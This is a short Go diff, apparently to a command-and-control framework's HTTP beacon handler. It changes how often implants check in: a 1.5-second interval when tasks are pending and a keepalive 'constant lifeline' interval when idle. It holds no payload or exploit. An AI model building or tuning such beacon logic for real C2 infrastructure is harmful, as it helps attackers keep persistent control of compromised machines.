@@ -337,14 +337,21 @@ func (ht *HTTPTransport) handleBeacon(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 	
-	// Calculate adaptive sleep interval
+	// Calculate adaptive sleep interval with constant lifeline
 	// If there are pending tasks, use shorter interval (1-2 seconds)
-	// Otherwise use configured sleep interval
-	adaptiveSleep := ht.config.Communication.Sleep.Seconds()
+	// Otherwise use minimum keepalive interval to maintain constant lifeline
+	adaptiveSleep := ht.config.Communication.KeepAliveInterval.Seconds()
+	if adaptiveSleep == 0 {
+		// Fallback to Sleep if KeepAliveInterval not set
+		adaptiveSleep = ht.config.Communication.Sleep.Seconds()
+	}
 	if len(pendingTasks) > 0 {
 		// Active tasking - use fast interval (1-2 seconds with jitter)
 		adaptiveSleep = 1.5 // Base 1.5 seconds when tasks are pending
 		ht.logger.Debug("Adaptive sleep: tasks pending, using fast interval %.2fs", adaptiveSleep)
+	} else {
+		// No tasks - use keepalive interval to maintain constant lifeline
+		ht.logger.Debug("Adaptive sleep: no tasks, using keepalive interval %.2fs for constant lifeline", adaptiveSleep)
 	}
 	
 	response := map[string]interface{}{
